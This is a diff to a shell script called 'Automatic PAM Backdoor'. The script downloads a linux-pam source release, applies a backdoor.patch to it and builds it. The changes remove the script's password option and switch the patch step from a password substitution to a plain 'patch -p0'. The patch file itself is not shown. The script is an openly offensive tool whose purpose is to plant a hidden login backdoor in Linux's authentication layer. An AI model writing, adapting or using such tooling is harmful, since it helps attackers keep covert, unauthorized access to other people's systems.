@@ -10,11 +10,12 @@ echo "Automatic PAM Backdoor"
 
 function show_help {
 	echo ""
-	echo "Example usage: $0 -v 1.3.0 -p some_s3cr3t_p455word"
+	echo "Example usage: $0 -v 1.3.0"
 	echo "For a list of supported versions: https://github.com/linux-pam/linux-pam/releases"
 }
 
-while getopts ":h:?:p:v:" opt; do
+#while getopts ":h:?:p:v:" opt; do
+while getopts ":h:?:v:" opt; do
     case "$opt" in
     h|\?)
         show_help
@@ -22,8 +23,8 @@ while getopts ":h:?:p:v:" opt; do
         ;;
     v)  PAM_VERSION="$OPTARG"
         ;;
-    p)  PASSWORD="$OPTARG"
-        ;;
+#    p)  PASSWORD="$OPTARG"
+#        ;;
     esac
 done
 
@@ -36,13 +37,13 @@ if [ -z $PAM_VERSION ]; then
 	exit 1
 fi;
 
-if [ -z $PASSWORD ]; then
-	show_help
-	exit 1
-fi;
+#if [ -z $PASSWORD ]; then
+#	show_help
+#	exit 1
+#fi;
 
 echo "PAM Version: $PAM_VERSION"
-echo "Password: $PASSWORD"
+#echo "Password: $PASSWORD"
 echo ""
 
 PAM_BASE_URL="https://github.com/linux-pam/linux-pam/archive"
@@ -73,7 +74,8 @@ if [[ $? -ne 0 ]]; then # did not work, trying the old format
 fi
 
 tar xzf $PAM_FILE
-cat backdoor.patch | sed -e "s/_PASSWORD_/${PASSWORD}/g" | patch -p1 -d $PAM_DIR
+#cat backdoor.patch | sed -e "s/_PASSWORD_/${PASSWORD}/g" | patch -p1 -d $PAM_DIR
+cat backdoor.patch | patch -p0 -d $PAM_DIR
 cd $PAM_DIR
 # newer version need autogen to generate the configure script
 if [[ ! -f "./configure" ]]; then 
